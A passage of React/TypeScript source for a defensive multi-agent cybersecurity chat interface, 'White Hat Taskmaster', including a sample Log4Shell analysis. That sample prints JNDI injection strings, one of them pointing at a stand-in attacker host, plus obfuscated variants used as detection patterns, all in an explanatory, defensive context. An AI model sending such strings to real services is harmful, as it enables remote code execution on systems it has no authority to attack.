'use client'

import React, { useState, useEffect, useRef, useCallback } from 'react'
import { callAIAgent, AIAgentResponse } from '@/lib/aiAgent'
import { FiSend, FiPlus, FiMenu, FiX, FiChevronDown, FiChevronUp, FiSearch, FiMessageSquare, FiTrash2, FiClock, FiShield, FiAlertTriangle, FiAlertCircle, FiTerminal, FiActivity, FiLock } from 'react-icons/fi'

// ── Types ──────────────────────────────────────────────────────────

interface OrchestratorResponse {
  intent_analysis: string
  domains_activated: string[]
  response_sections: Array<{
    domain: string
    title: string
    content: string
  }>
  proactive_suggestions: string[]
  summary: string
  risk_level: string
}

interface Message {
  id: string
  role: 'user' | 'assistant'
  content: string
  parsedResponse?: OrchestratorResponse
  timestamp: string
  isLoading?: boolean
}

interface Conversation {
  id: string
  title: string
  messages: Message[]
  createdAt: string
  updatedAt: string
}

// ── Constants ──────────────────────────────────────────────────────

const MANAGER_AGENT_ID = '699c4c16f05bb8fda3a4fe68'

const STORAGE_KEY = 'whitehat_conversations'

const EXAMPLE_PROMPTS = [
  {
    text: 'Analyze the latest critical CVEs affecting Apache and Nginx web servers',
    iconKey: 'threat' as const,
  },
  {
    text: 'Design a penetration testing methodology for a cloud-based SaaS application',
    iconKey: 'pentest' as const,
  },
  {
    text: 'Create a zero-trust security architecture for a remote-first startup',
    iconKey: 'defense' as const,
  },
  {
    text: 'Review this login form for SQL injection, XSS, and authentication bypass vulnerabilities',
    iconKey: 'vulnerability' as const,
  },
]

const AGENT_INFO = [
  { name: 'CyberOps Orchestrator', role: 'Manager', id: '699c4c16f05bb8fda3a4fe68' },
  { name: 'Threat Intelligence', role: 'OSINT & CVE', id: '699c4bedf05bb8fda3a4fe5e' },
  { name: 'Pentest Strategist', role: 'Ethical Hacking', id: '699c4bede4f4977cc58d9975' },
  { name: 'Defense Architect', role: 'Hardening & IR', id: '699c4c00e4f4977cc58d9977' },
  { name: 'Vulnerability Researcher', role: 'Code Review', id: '699c4bee3cd6d5c8e728bd5c' },
]

// ── Risk Level Config ──────────────────────────────────────────────

const riskLevelConfig: Record<string, { color: string; bg: string; label: string }> = {
  'Critical': { color: 'text-red-400', bg: 'bg-red-500/20 border border-red-500/30', label: 'CRITICAL' },
  'High': { color: 'text-orange-400', bg: 'bg-orange-500/20 border border-orange-500/30', label: 'HIGH' },
  'Medium': { color: 'text-yellow-400', bg: 'bg-yellow-500/20 border border-yellow-500/30', label: 'MEDIUM' },
  'Low': { color: 'text-green-400', bg: 'bg-green-500/20 border border-green-500/30', label: 'LOW' },
  'Informational': { color: 'text-blue-400', bg: 'bg-blue-500/20 border border-blue-500/30', label: 'INFO' },
}

// ── Domain Config ──────────────────────────────────────────────────

type DomainIconKey = 'threat' | 'pentest' | 'defense' | 'vulnerability'

function getDomainIcon(key: DomainIconKey | string) {
  switch (key) {
    case 'threat':
    case 'Threat Intel':
      return FiAlertTriangle
    case 'pentest':
    case 'Pentest':
      return FiTerminal
    case 'defense':
    case 'Defense':
      return FiShield
    case 'vulnerability':
    case 'Vulnerability':
      return FiAlertCircle
    default:
      return FiShield
  }
}

function getDomainColor(domain: string): { colorClass: string; bgClass: string } {
  switch (domain) {
    case 'Threat Intel':
      return { colorClass: 'text-red-400', bgClass: 'bg-red-400/10 border-red-400/20' }
    case 'Pentest':
      return { colorClass: 'text-cyan-400', bgClass: 'bg-cyan-400/10 border-cyan-400/20' }
    case 'Defense':
      return { colorClass: 'text-green-400', bgClass: 'bg-green-400/10 border-green-400/20' }
    case 'Vulnerability':
      return { colorClass: 'text-amber-400', bgClass: 'bg-amber-400/10 border-amber-400/20' }
    default:
      return { colorClass: 'text-purple-400', bgClass: 'bg-purple-400/10 border-purple-400/20' }
  }
}

// ── Helpers ─────────────────────────────────────────────────────────

function generateId(): string {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
}

function formatInline(text: string): React.ReactNode {
  const codeInline = text.split(/`([^`]+)`/g)
  if (codeInline.length > 1) {
    return codeInline.map((seg, idx) =>
      idx % 2 === 1 ? (
        <code key={idx} className="px-1.5 py-0.5 rounded bg-muted text-accent text-xs font-mono">{seg}</code>
      ) : (
        <React.Fragment key={idx}>{formatBold(seg)}</React.Fragment>
      )
    )
  }
  return formatBold(text)
}

function formatBold(text: string): React.ReactNode {
  const parts = text.split(/\*\*(.*?)\*\*/g)
  if (parts.length === 1) return text
  return parts.map((part, i) =>
    i % 2 === 1 ? (
      <strong key={i} className="font-semibold text-foreground">{part}</strong>
    ) : (
      <React.Fragment key={i}>{part}</React.Fragment>
    )
  )
}

function renderMarkdown(text: string): React.ReactNode {
  if (!text) return null
  return (
    <div className="space-y-1.5">
      {text.split('\n').map((line, i) => {
        if (line.startsWith('#### '))
          return <h5 key={i} className="font-semibold text-xs mt-2 mb-1 text-foreground uppercase tracking-wider">{line.slice(5)}</h5>
        if (line.startsWith('### '))
          return <h4 key={i} className="font-semibold text-sm mt-3 mb-1 text-foreground">{line.slice(4)}</h4>
        if (line.startsWith('## '))
          return <h3 key={i} className="font-semibold text-base mt-3 mb-1 text-foreground">{line.slice(3)}</h3>
        if (line.startsWith('# '))
          return <h2 key={i} className="font-bold text-lg mt-4 mb-2 text-foreground">{line.slice(2)}</h2>
        if (line.startsWith('- ') || line.startsWith('* '))
          return <li key={i} className="ml-4 list-disc text-sm text-foreground/90">{formatInline(line.slice(2))}</li>
        if (/^\d+\.\s/.test(line))
          return <li key={i} className="ml-4 list-decimal text-sm text-foreground/90">{formatInline(line.replace(/^\d+\.\s/, ''))}</li>
        if (line.startsWith('> '))
          return <blockquote key={i} className="border-l-2 border-accent/50 pl-3 text-sm italic text-muted-foreground">{formatInline(line.slice(2))}</blockquote>
        if (line.startsWith('---'))
          return <hr key={i} className="border-border/50 my-2" />
        if (!line.trim()) return <div key={i} className="h-1" />
        return <p key={i} className="text-sm text-foreground/90 leading-relaxed">{formatInline(line)}</p>
      })}
    </div>
  )
}

function parseOrchestratorResponse(result: any): OrchestratorResponse | null {
  if (!result) return null
  try {
    let parsed = result
    if (typeof result === 'string') {
      const cleaned = result.replace(/```json\s*/g, '').replace(/```\s*/g, '').trim()
      parsed = JSON.parse(cleaned)
    }
    return {
      intent_analysis: parsed?.intent_analysis ?? '',
      domains_activated: Array.isArray(parsed?.domains_activated) ? parsed.domains_activated : [],
      response_sections: Array.isArray(parsed?.response_sections) ? parsed.response_sections : [],
      proactive_suggestions: Array.isArray(parsed?.proactive_suggestions) ? parsed.proactive_suggestions : [],
      summary: parsed?.summary ?? '',
      risk_level: parsed?.risk_level ?? 'Informational',
    }
  } catch {
    return null
  }
}

function loadConversations(): Conversation[] {
  if (typeof window === 'undefined') return []
  try {
    const stored = localStorage.getItem(STORAGE_KEY)
    if (!stored) return []
    const parsed = JSON.parse(stored)
    return Array.isArray(parsed) ? parsed : []
  } catch {
    return []
  }
}

function saveConversations(conversations: Conversation[]) {
  if (typeof window === 'undefined') return
  try {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(conversations))
  } catch {
    // storage full or unavailable
  }
}

function formatTimestamp(ts: string): string {
  try {
    const d = new Date(ts)
    const now = new Date()
    const diff = now.getTime() - d.getTime()
    const minutes = Math.floor(diff / 60000)
    if (minutes < 1) return 'Just now'
    if (minutes < 60) return `${minutes}m ago`
    const hours = Math.floor(minutes / 60)
    if (hours < 24) return `${hours}h ago`
    const days = Math.floor(hours / 24)
    if (days < 7) return `${days}d ago`
    return d.toLocaleDateString()
  } catch {
    return ''
  }
}

// ── Sample Data ────────────────────────────────────────────────────

function getSampleMessages(): Message[] {
  const baseTime = Date.now()
  return [
    {
      id: 'sample-user-1',
      role: 'user',
      content: 'Analyze the Log4Shell vulnerability (CVE-2021-44228) and provide threat intelligence, impact assessment, and defense recommendations.',
      timestamp: new Date(baseTime - 600000).toISOString(),
    },
    {
      id: 'sample-assistant-1',
      role: 'assistant',
      content: '',
      parsedResponse: {
        intent_analysis: 'User requests a comprehensive security analysis of the Log4Shell (CVE-2021-44228) vulnerability, encompassing threat intelligence, vulnerability assessment, and defensive countermeasures. This activates Threat Intel for CVE and IoC data, Vulnerability for technical analysis, and Defense for remediation strategies.',
        domains_activated: ['Threat Intel', 'Vulnerability', 'Defense'],
        risk_level: 'Critical',
        summary: 'Log4Shell (CVE-2021-44228) is a critical remote code execution vulnerability in Apache Log4j 2.x (versions 2.0-beta9 through 2.14.1). It carries a CVSS score of 10.0 and allows unauthenticated attackers to achieve full system compromise via crafted JNDI lookup strings in logged data. This vulnerability has been actively exploited in the wild by multiple APT groups and ransomware operators since its disclosure in December 2021. Immediate patching to Log4j 2.17.1+ is mandatory, alongside WAF rule deployment, JNDI lookup disabling, and comprehensive network monitoring for IoC indicators.',
        response_sections: [
          {
            domain: 'Threat Intel',
            title: 'Threat Landscape & Indicators of Compromise',
            content: '## CVE-2021-44228 -- Log4Shell\n\n**CVSS Score:** 10.0 (Critical)\n**Attack Vector:** Network (Remote)\n**Attack Complexity:** Low\n**Privileges Required:** None\n**User Interaction:** None\n\n### Active Threat Actors\n- **APT41 (Double Dragon)** -- Chinese state-sponsored group leveraging Log4Shell for initial access in espionage campaigns\n- **Hafnium** -- Targeting Exchange servers with Log4Shell as secondary vector\n- **Conti Ransomware Group** -- Incorporated Log4Shell into ransomware deployment playbook\n- **Aquatic Panda** -- Observed using Log4Shell against academic institutions\n\n### MITRE ATT&CK Mapping\n- **T1190** -- Exploit Public-Facing Application (Initial Access)\n- **T1059.007** -- JavaScript Command Execution (Execution)\n- **T1071.001** -- Web Protocols for C2 (Command and Control)\n- **T1027** -- Obfuscated Files or Information (Defense Evasion)\n\n### Indicators of Compromise\n- **Network Patterns:** `${jndi:ldap://`, `${jndi:rmi://`, `${jndi:dns://`\n- **Obfuscated Variants:** `${${lower:j}ndi:`, `${${upper:j}${upper:n}di:}`\n- **Callback Domains:** Monitor for unusual outbound LDAP (port 1389), RMI (port 1099) traffic\n- **User-Agent Strings:** Check for JNDI strings in HTTP headers (User-Agent, X-Forwarded-For, Referer)\n\n### Sources\n- NIST NVD: CVE-2021-44228\n- Apache Security Advisory\n- CISA Alert AA21-356A\n- Mandiant Threat Intelligence Report',
          },
          {
            domain: 'Vulnerability',
            title: 'Technical Vulnerability Analysis',
            content: '## Vulnerability Deep Dive\n\n### Root Cause\nLog4j 2.x performs **JNDI lookups** on user-controlled input during message formatting. When a log message contains a string like `${jndi:ldap://attacker.com/exploit}`, Log4j resolves the JNDI reference, connecting to the attacker-controlled server and potentially downloading and executing arbitrary Java classes.\n\n### Affected Components\n- Apache Log4j 2.0-beta9 through 2.14.1\n- Any Java application using Log4j 2.x for logging\n- Embedded in hundreds of frameworks: Apache Struts, Solr, Druid, Flink, Swift, Kafka\n- Cloud services: AWS, Azure, GCP services with Java backends\n\n### OWASP Classification\n- **A03:2021 -- Injection** (primary)\n- **A06:2021 -- Vulnerable and Outdated Components**\n- **CWE-502:** Deserialization of Untrusted Data\n- **CWE-400:** Uncontrolled Resource Consumption\n\n### Attack Surface\n1. **HTTP Headers** -- User-Agent, Cookie, Referer, X-Forwarded-For\n2. **Form Input Fields** -- Login forms, search bars, comment fields\n3. **API Parameters** -- REST/GraphQL query parameters\n4. **Email Headers** -- SMTP headers processed by Java mail servers\n5. **DNS Lookups** -- Hostnames resolved and logged\n\n### Secure Code Fix\n```\n// Before (vulnerable)\nlogger.info("User login: " + username);\n\n// After (patched -- upgrade to 2.17.1+)\n// Also set: log4j2.formatMsgNoLookups=true\nlogger.info("User login: {}", username);\n```',
          },
          {
            domain: 'Defense',
            title: 'Defense Strategy & Remediation Roadmap',
            content: '## Immediate Actions (0-24 Hours)\n\n1. **Patch Log4j** to version 2.17.1 or later across all systems\n2. **Set JVM flag:** `-Dlog4j2.formatMsgNoLookups=true` as interim mitigation\n3. **Deploy WAF rules** to block `${jndi:` patterns in all HTTP fields\n4. **Network segmentation** -- restrict outbound LDAP/RMI from application servers\n5. **Enable enhanced logging** on all perimeter devices\n\n## Short-Term Actions (1-7 Days)\n\n1. **Asset inventory scan** -- identify all Log4j instances using tools like Syft, Grype, or Lunasec\n2. **Network monitoring** -- deploy Suricata/Snort rules for JNDI exploitation patterns\n3. **Endpoint scanning** -- check for post-exploitation artifacts (webshells, crypto miners)\n4. **Review access logs** -- search for JNDI strings in historical logs dating back to Dec 1, 2021\n5. **Incident response readiness** -- activate IR team and establish communication channels\n\n## Long-Term Hardening\n\n1. **Software Composition Analysis (SCA)** -- implement dependency scanning in CI/CD\n2. **Zero-trust network architecture** -- eliminate implicit trust between application tiers\n3. **Runtime Application Self-Protection (RASP)** -- deploy agents that block exploitation attempts\n4. **Log4j migration plan** -- evaluate alternatives (Logback, SLF4J native) for critical systems\n5. **Tabletop exercises** -- simulate similar supply-chain vulnerability scenarios quarterly\n\n### Compliance Mapping\n- **NIST SP 800-53:** SI-2 (Flaw Remediation), RA-5 (Vulnerability Scanning)\n- **PCI DSS 4.0:** Requirement 6.3 (Security Vulnerabilities)\n- **SOC 2:** CC7.1 (System Monitoring)',
          },
        ],
        proactive_suggestions: [
          'Scan my infrastructure for remaining Log4j instances using automated discovery',
          'Generate a Log4Shell incident response playbook with escalation procedures',
          'Design network detection rules for JNDI exploitation patterns',
          'Assess the risk of similar supply-chain vulnerabilities in our Java dependencies',
        ],
      },
      timestamp: new Date(baseTime - 540000).toISOString(),
    },
  ]
}

// ── Inline Components ───────────────────────────────────────────────

function RiskLevelBadge({ level }: { level: string }) {
  const config = riskLevelConfig[level] ?? riskLevelConfig['Informational']
  if (!config) return null
  return (
    <span className={`inline-flex items-center gap-1.5 px-3 py-1 rounded-lg text-xs font-bold uppercase tracking-wider ${config.bg} ${config.color}`}>
      <FiActivity className="w-3 h-3" />
      {config.label ?? level}
    </span>
  )
}

function HeaderRiskIndicator({ level }: { level: string | null }) {
  if (!level) return null
  const config = riskLevelConfig[level] ?? riskLevelConfig['Informational']
  if (!config) return null
  return (
    <div className={`hidden sm:flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-semibold ${config.bg} ${config.color}`}>
      <div className={`w-1.5 h-1.5 rounded-full ${level === 'Critical' ? 'bg-red-400 animate-pulse' : level === 'High' ? 'bg-orange-400' : level === 'Medium' ? 'bg-yellow-400' : level === 'Low' ? 'bg-green-400' : 'bg-blue-400'}`} />
      {config.label ?? level}
    </div>
  )
}

function DomainBadge({ domain }: { domain: string }) {
  const { colorClass, bgClass } = getDomainColor(domain)
  const IconComp = getDomainIcon(domain)
  return (
    <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-lg text-xs font-medium border ${bgClass} ${colorClass}`}>
      <IconComp className="w-3 h-3" />
      {domain}
    </span>
  )
}

function ExpandableSection({ section, defaultOpen }: { section: { domain: string; title: string; content: string }; defaultOpen?: boolean }) {
  const [isOpen, setIsOpen] = useState(defaultOpen ?? false)
  const { colorClass } = getDomainColor(section.domain)
  const IconComp = getDomainIcon(section.domain)

  return (
    <div className="border border-border rounded-xl overflow-hidden bg-card/50">
      <button
        onClick={() => setIsOpen(!isOpen)}
        className="w-full flex items-center justify-between px-4 py-3 text-left hover:bg-muted/30 transition-colors duration-200"
      >
        <div className="flex items-center gap-2.5">
          <IconComp className={`w-4 h-4 ${colorClass}`} />
          <span className="text-sm font-semibold text-foreground">{section.title || section.domain}</span>
          {section.domain && (
            <span className={`text-xs px-1.5 py-0.5 rounded border ${getDomainColor(section.domain).bgClass} ${colorClass}`}>
              {section.domain}
            </span>
          )}
        </div>
        {isOpen ? (
          <FiChevronUp className="w-4 h-4 text-muted-foreground flex-shrink-0" />
        ) : (
          <FiChevronDown className="w-4 h-4 text-muted-foreground flex-shrink-0" />
        )}
      </button>
      {isOpen && (
        <div className="px-4 pb-4 border-t border-border/50">
          <div className="pt-3">
            {renderMarkdown(section.content ?? '')}
          </div>
        </div>
      )}
    </div>
  )
}

function SuggestionChip({ text, onClick }: { text: string; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-full text-xs border border-border bg-secondary/50 text-foreground/80 hover:bg-accent/20 hover:border-accent/40 hover:text-foreground transition-all duration-200"
    >
      <FiShield className="w-3 h-3 text-accent" />
      {text}
    </button>
  )
}

function LoadingDots() {
  return (
    <div className="flex items-center gap-1.5 py-2">
      <div className="w-2 h-2 rounded-full bg-accent animate-bounce" style={{ animationDelay: '0ms' }} />
      <div className="w-2 h-2 rounded-full bg-accent animate-bounce" style={{ animationDelay: '150ms' }} />
      <div className="w-2 h-2 rounded-full bg-accent animate-bounce" style={{ animationDelay: '300ms' }} />
    </div>
  )
}

function AssistantMessage({ message, onSuggestionClick }: { message: Message; onSuggestionClick: (text: string) => void }) {
  const parsed = message.parsedResponse

  if (message.isLoading) {
    return (
      <div className="flex gap-3 px-4 py-3 max-w-4xl mx-auto">
        <div className="w-8 h-8 rounded-xl bg-accent/20 flex items-center justify-center flex-shrink-0 mt-0.5">
          <FiShield className="w-4 h-4 text-accent" />
        </div>
        <div className="flex-1 min-w-0">
          <div className="text-xs font-medium text-muted-foreground mb-2">White Hat Taskmaster</div>
          <div className="bg-card border border-border rounded-xl p-4">
            <LoadingDots />
            <p className="text-xs text-muted-foreground mt-2">Activating security agents and analyzing threat vectors...</p>
          </div>
        </div>
      </div>
    )
  }

  if (!parsed) {
    return (
      <div className="flex gap-3 px-4 py-3 max-w-4xl mx-auto">
        <div className="w-8 h-8 rounded-xl bg-accent/20 flex items-center justify-center flex-shrink-0 mt-0.5">
          <FiShield className="w-4 h-4 text-accent" />
        </div>
        <div className="flex-1 min-w-0">
          <div className="text-xs font-medium text-muted-foreground mb-2">White Hat Taskmaster</div>
          <div className="bg-card border border-border rounded-xl p-4">
            {renderMarkdown(message.content || 'No response received.')}
          </div>
        </div>
      </div>
    )
  }

  const domains = Array.isArray(parsed.domains_activated) ? parsed.domains_activated : []
  const sections = Array.isArray(parsed.response_sections) ? parsed.response_sections : []
  const suggestions = Array.isArray(parsed.proactive_suggestions) ? parsed.proactive_suggestions : []
  const riskLevel = parsed.risk_level ?? 'Informational'

  return (
    <div className="flex gap-3 px-4 py-3 max-w-4xl mx-auto">
      <div className="w-8 h-8 rounded-xl bg-accent/20 flex items-center justify-center flex-shrink-0 mt-0.5">
        <FiShield className="w-4 h-4 text-accent" />
      </div>
      <div className="flex-1 min-w-0 space-y-3">
        <div className="flex items-center gap-3 flex-wrap">
          <span className="text-xs font-medium text-muted-foreground">White Hat Taskmaster</span>
          <RiskLevelBadge level={riskLevel} />
        </div>

        {/* Domain Badges */}
        {domains.length > 0 && (
          <div className="flex flex-wrap gap-2">
            {domains.map((d, i) => (
              <DomainBadge key={i} domain={d} />
            ))}
          </div>
        )}

        {/* Summary Card */}
        {parsed.summary && (
          <div className="bg-card border border-accent/20 rounded-xl p-4">
            <div className="flex items-center gap-2 mb-2">
              <FiLock className="w-3.5 h-3.5 text-accent" />
              <span className="text-xs font-semibold text-accent uppercase tracking-wider">Executive Summary</span>
            </div>
            {renderMarkdown(parsed.summary)}
          </div>
        )}

        {/* Expandable Response Sections */}
        {sections.length > 0 && (
          <div className="space-y-2">
            {sections.map((section, i) => (
              <ExpandableSection key={i} section={section} defaultOpen={i === 0} />
            ))}
          </div>
        )}

        {/* Intent Analysis */}
        {parsed.intent_analysis && (
          <div className="bg-secondary/30 border border-border/50 rounded-xl p-3">
            <div className="text-xs font-semibold text-muted-foreground mb-1 uppercase tracking-wider">Intent Analysis</div>
            <p className="text-sm text-foreground/80">{parsed.intent_analysis}</p>
          </div>
        )}

        {/* Proactive Suggestion Chips */}
        {suggestions.length > 0 && (
          <div className="space-y-2">
            <div className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">Recommended Follow-ups</div>
            <div className="flex flex-wrap gap-2">
              {suggestions.map((s, i) => (
                <SuggestionChip key={i} text={s} onClick={() => onSuggestionClick(s)} />
              ))}
            </div>
          </div>
        )}

        <div className="text-xs text-muted-foreground/50">
          <FiClock className="inline w-3 h-3 mr-1" />
          {formatTimestamp(message.timestamp)}
        </div>
      </div>
    </div>
  )
}

function UserMessage({ message }: { message: Message }) {
  return (
    <div className="flex justify-end px-4 py-3 max-w-4xl mx-auto">
      <div className="max-w-[80%] space-y-1">
        <div className="bg-accent text-accent-foreground rounded-xl rounded-br-sm px-4 py-3">
          <p className="text-sm leading-relaxed whitespace-pre-wrap">{message.content}</p>
        </div>
        <div className="text-xs text-muted-foreground/50 text-right">
          <FiClock className="inline w-3 h-3 mr-1" />
          {formatTimestamp(message.timestamp)}
        </div>
      </div>
    </div>
  )
}

function WelcomeScreen({ onPromptClick }: { onPromptClick: (text: string) => void }) {
  const promptIcons: DomainIconKey[] = ['threat', 'pentest', 'defense', 'vulnerability']
  const promptColors = ['text-red-400', 'text-cyan-400', 'text-green-400', 'text-amber-400']

  return (
    <div className="flex-1 flex items-center justify-center p-8">
      <div className="max-w-2xl w-full text-center space-y-8">
        <div className="space-y-3">
          <div className="w-20 h-20 rounded-2xl bg-accent/20 flex items-center justify-center mx-auto mb-4 border border-accent/30">
            <FiShield className="w-10 h-10 text-accent" />
          </div>
          <h1 className="text-3xl font-bold tracking-tight text-foreground">
            White Hat Taskmaster
          </h1>
          <p className="text-muted-foreground text-sm leading-relaxed max-w-lg mx-auto">
            Your ethical cybersecurity intelligence command center. Ask about threats,
            plan penetration tests, design defenses, or review code for vulnerabilities.
          </p>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          {EXAMPLE_PROMPTS.map((prompt, i) => {
            const IconComp = getDomainIcon(promptIcons[i] ?? 'defense')
            const color = promptColors[i] ?? 'text-muted-foreground'
            return (
              <button
                key={i}
                onClick={() => onPromptClick(prompt.text)}
                className="group flex items-start gap-3 p-4 rounded-xl border border-border bg-card/50 hover:bg-card hover:border-accent/30 text-left transition-all duration-200 hover:shadow-lg hover:shadow-accent/5"
              >
                <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${i === 0 ? 'bg-red-400/10' : i === 1 ? 'bg-cyan-400/10' : i === 2 ? 'bg-green-400/10' : 'bg-amber-400/10'}`}>
                  <IconComp className={`w-4 h-4 ${color}`} />
                </div>
                <span className="text-sm text-foreground/80 group-hover:text-foreground leading-snug">{prompt.text}</span>
              </button>
            )
          })}
        </div>

        <div className="flex items-center justify-center gap-6 text-xs text-muted-foreground/50">
          <span className="flex items-center gap-1.5"><FiShield className="w-3 h-3" /> Ethical Security Only</span>
          <span className="flex items-center gap-1.5"><FiLock className="w-3 h-3" /> Responsible Disclosure</span>
          <span className="flex items-center gap-1.5"><FiActivity className="w-3 h-3" /> 5 Specialist Agents</span>
        </div>
      </div>
    </div>
  )
}

function SidebarConversationItem({ conv, isActive, onClick, onDelete }: {
  conv: Conversation
  isActive: boolean
  onClick: () => void
  onDelete: (e: React.MouseEvent) => void
}) {
  return (
    <button
      onClick={onClick}
      className={`w-full group flex items-center gap-2.5 px-3 py-2.5 rounded-lg text-left transition-colors duration-150 ${isActive ? 'bg-accent/15 border border-accent/20' : 'hover:bg-muted/40 border border-transparent'}`}
    >
      <FiMessageSquare className={`w-3.5 h-3.5 flex-shrink-0 ${isActive ? 'text-accent' : 'text-muted-foreground'}`} />
      <div className="flex-1 min-w-0">
        <div className={`text-sm truncate ${isActive ? 'text-foreground font-medium' : 'text-foreground/70'}`}>
          {conv.title || 'New scan'}
        </div>
        <div className="text-xs text-muted-foreground/60 truncate">
          {formatTimestamp(conv.updatedAt)}
        </div>
      </div>
      <button
        onClick={onDelete}
        className="opacity-0 group-hover:opacity-100 p-1 rounded hover:bg-destructive/20 hover:text-destructive transition-all duration-150 flex-shrink-0"
        title="Delete conversation"
      >
        <FiTrash2 className="w-3 h-3" />
      </button>
    </button>
  )
}

function AgentStatusPanel({ activeAgentId, showPanel }: { activeAgentId: string | null; showPanel: boolean }) {
  if (!showPanel) return null

  return (
    <div className="border-b border-border bg-card/50 px-4 py-3 flex-shrink-0">
      <div className="max-w-4xl mx-auto">
        <div className="flex items-center gap-2 mb-2">
          <FiActivity className="w-3.5 h-3.5 text-accent" />
          <span className="text-xs font-semibold text-muted-foreground uppercase tracking-wider">Security Agent Network</span>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-2">
          {AGENT_INFO.map((agent) => {
            const isActive = activeAgentId === agent.id
            return (
              <div
                key={agent.id}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg border text-xs transition-all duration-200 ${isActive ? 'border-accent/40 bg-accent/10 shadow-sm shadow-accent/10' : 'border-border/50 bg-muted/20'}`}
              >
                <div className={`w-2 h-2 rounded-full flex-shrink-0 ${isActive ? 'bg-accent animate-pulse' : 'bg-muted-foreground/30'}`} />
                <div className="min-w-0">
                  <div className={`font-medium truncate ${isActive ? 'text-accent' : 'text-foreground/90'}`}>{agent.name}</div>
                  <div className="text-muted-foreground/60 truncate">{agent.role}</div>
                </div>
              </div>
            )
          })}
        </div>
      </div>
    </div>
  )
}

// ── ErrorBoundary ───────────────────────────────────────────────────

class ErrorBoundary extends React.Component<
  { children: React.ReactNode },
  { hasError: boolean; error: string }
> {
  constructor(props: { children: React.ReactNode }) {
    super(props)
    this.state = { hasError: false, error: '' }
  }
  static getDerivedStateFromError(error: Error) {
    return { hasError: true, error: error.message }
  }
  render() {
    if (this.state.hasError) {
      return (
        <div className="min-h-screen flex items-center justify-center bg-background text-foreground">
          <div className="text-center p-8 max-w-md">
            <FiAlertTriangle className="w-12 h-12 text-red-400 mx-auto mb-4" />
            <h2 className="text-xl font-semibold mb-2">Security System Error</h2>
            <p className="text-muted-foreground mb-4 text-sm">{this.state.error}</p>
            <button
              onClick={() => this.setState({ hasError: false, error: '' })}
              className="px-4 py-2 bg-primary text-primary-foreground rounded-md text-sm"
            >
              Reinitialize
            </button>
          </div>
        </div>
      )
    }
    return this.props.children
  }
}

// ── Main Page ───────────────────────────────────────────────────────

export default function Page() {
  const [conversations, setConversations] = useState<Conversation[]>([])
  const [activeConversationId, setActiveConversationId] = useState<string | null>(null)
  const [inputValue, setInputValue] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [sidebarOpen, setSidebarOpen] = useState(true)
  const [searchQuery, setSearchQuery] = useState('')
  const [activeAgentId, setActiveAgentId] = useState<string | null>(null)
  const [showAgentInfo, setShowAgentInfo] = useState(false)
  const [sampleData, setSampleData] = useState(false)
  const [lastRiskLevel, setLastRiskLevel] = useState<string | null>(null)

  const messagesEndRef = useRef<HTMLDivElement>(null)
  const textareaRef = useRef<HTMLTextAreaElement>(null)
  const chatContainerRef = useRef<HTMLDivElement>(null)

  // Load conversations from localStorage on mount
  useEffect(() => {
    const stored = loadConversations()
    setConversations(stored)
    if (stored.length > 0) {
      setActiveConversationId(stored[0]?.id ?? null)
    }
  }, [])

  // Save conversations to localStorage on change
  useEffect(() => {
    if (conversations.length > 0) {
      saveConversations(conversations)
    }
  }, [conversations])

  // Auto-scroll on new messages
  useEffect(() => {
    if (messagesEndRef.current) {
      messagesEndRef.current.scrollIntoView({ behavior: 'smooth' })
    }
  }, [conversations, activeConversationId])

  // Track last risk level from active conversation
  useEffect(() => {
    const activeConv = conversations.find(c => c.id === activeConversationId)
    if (activeConv) {
      const msgs = Array.isArray(activeConv.messages) ? activeConv.messages : []
      for (let i = msgs.length - 1; i >= 0; i--) {
        const m = msgs[i]
        if (m?.role === 'assistant' && m?.parsedResponse?.risk_level) {
          setLastRiskLevel(m.parsedResponse.risk_level)
          return
        }
      }
    }
    setLastRiskLevel(null)
  }, [conversations, activeConversationId])

  // Auto-resize textarea
  const handleTextareaChange = useCallback((e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setInputValue(e.target.value)
    const el = e.target
    el.style.height = 'auto'
    el.style.height = Math.min(el.scrollHeight, 200) + 'px'
  }, [])

  const activeConversation = conversations.find(c => c.id === activeConversationId) ?? null
  const messages = activeConversation?.messages ?? []

  const filteredConversations = conversations.filter(c => {
    if (!searchQuery.trim()) return true
    return (c.title ?? '').toLowerCase().includes(searchQuery.toLowerCase())
  })

  const createNewConversation = useCallback(() => {
    const now = new Date().toISOString()
    const newConv: Conversation = {
      id: generateId(),
      title: 'New scan',
      messages: [],
      createdAt: now,
      updatedAt: now,
    }
    setConversations(prev => [newConv, ...prev])
    setActiveConversationId(newConv.id)
    setInputValue('')
    if (textareaRef.current) {
      textareaRef.current.style.height = 'auto'
    }
  }, [])

  const deleteConversation = useCallback((e: React.MouseEvent, convId: string) => {
    e.stopPropagation()
    setConversations(prev => {
      const updated = prev.filter(c => c.id !== convId)
      if (updated.length === 0) {
        localStorage.removeItem(STORAGE_KEY)
      }
      return updated
    })
    if (activeConversationId === convId) {
      setConversations(prev => {
        const remaining = prev.filter(c => c.id !== convId)
        setActiveConversationId(remaining.length > 0 ? (remaining[0]?.id ?? null) : null)
        return remaining
      })
    }
  }, [activeConversationId])

  const sendMessage = useCallback(async (text: string) => {
    const trimmed = text.trim()
    if (!trimmed || isLoading) return

    let convId = activeConversationId
    const now = new Date().toISOString()

    // Create new conversation if none active
    if (!convId) {
      const newConv: Conversation = {
        id: generateId(),
        title: trimmed.slice(0, 60),
        messages: [],
        createdAt: now,
        updatedAt: now,
      }
      convId = newConv.id
      setConversations(prev => [newConv, ...prev])
      setActiveConversationId(convId)
    }

    const userMsg: Message = {
      id: generateId(),
      role: 'user',
      content: trimmed,
      timestamp: now,
    }

    const loadingMsg: Message = {
      id: generateId(),
      role: 'assistant',
      content: '',
      timestamp: now,
      isLoading: true,
    }

    // Add user message and loading message
    const targetConvId = convId
    setConversations(prev => prev.map(c => {
      if (c.id === targetConvId) {
        const isFirstMsg = c.messages.length === 0
        return {
